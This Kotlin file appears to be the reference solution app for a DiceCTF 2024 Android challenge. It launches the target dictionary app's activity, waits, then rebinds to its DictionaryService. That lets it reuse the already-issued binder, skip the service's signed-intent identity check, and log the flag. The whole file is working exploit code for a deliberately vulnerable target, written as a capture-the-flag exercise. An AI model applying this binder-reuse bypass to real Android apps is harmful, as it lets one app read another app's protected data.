package com.dicectf2024.attackerapp

import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.dicectf2024.attackerapp.ui.theme.AttackerAppTheme
import com.dicectf2024.dictionaryservice.IDictionaryService
import kotlin.concurrent.thread

class MainActivity : ComponentActivity() {
    val TAG = "dicectf"

    private var dictionaryService: IDictionaryService? = null
    private var isBound = false

    private var connection = object : ServiceConnection {
        override fun onServiceConnected(componentName: ComponentName, service: IBinder) {
            dictionaryService = IDictionaryService.Stub.asInterface(service)
            isBound = true
            Log.d(TAG, "onServiceConnected called")

            val flag = dictionaryService?.getData("flag")
            Log.d(TAG, "got flag: $flag")
        }

        override fun onServiceDisconnected(componentName: ComponentName) {
            isBound = false
            dictionaryService = null
            Log.d(TAG, "onServiceDisconnected called")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            AttackerAppTheme {
                // A surface container using the 'background' color from the theme
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Greeting("Android")
                }
            }
        }

        // If you just try to bind to the service, you won't be able to supply the signed intent
        // extras to pass the security check in DictionaryService and onBind will return null.
        // Note that the result of bindService will still appear to be true, even if
        // DictionaryService returns a null Binder. But you can't call the getDefinition() method
        // to get flag on the null binder.
//         getFlag()

        // Intended solution is to launch DictionaryApp's activity that binds to DictionaryService,
        // then wait a while and after DictionaryApp has definitely bound to DictionaryService, try
        // to bind to DictionaryService again from AttackerApp. Since onBind() is only ever called
        // once, this will bypass the identity check and just return the same binder interface.
        // Now you can call getDefinition() and fetch flag in onServiceConnected() and print it
        // out from AttackerApp. Alternatively, you can also start a service that binds to
        // DictionaryService
        launchDefinitionActivity()
        thread {
            Log.d(TAG, "waiting 10 seconds...")
            Thread.sleep(10000)
            getFlag()
        }
    }

    private fun getFlag() {
        val intent = Intent().setComponent(
            ComponentName(
                "com.dicectf2024.dictionaryservice",
                "com.dicectf2024.dictionaryservice.DictionaryService"
            )
        )
        val bindingResult = bindService(intent, connection, BIND_AUTO_CREATE)
        Log.d(TAG, "binding result: $bindingResult")
    }

    private fun launchDefinitionActivity() {
        val intent = Intent().setClassName(
            "com.dicectf2024.dictionaryapp",
            "com.dicectf2024.dictionaryapp.DefinitionActivity"
        )
        try {
            startActivity(intent)
        } catch (e: ActivityNotFoundException) {
            Toast.makeText(this, "No matching activity found", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "onDestroy called")
        if (isBound) {
            unbindService(connection)
            dictionaryService = null
        }
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    AttackerAppTheme {
        Greeting("Android")
    }
}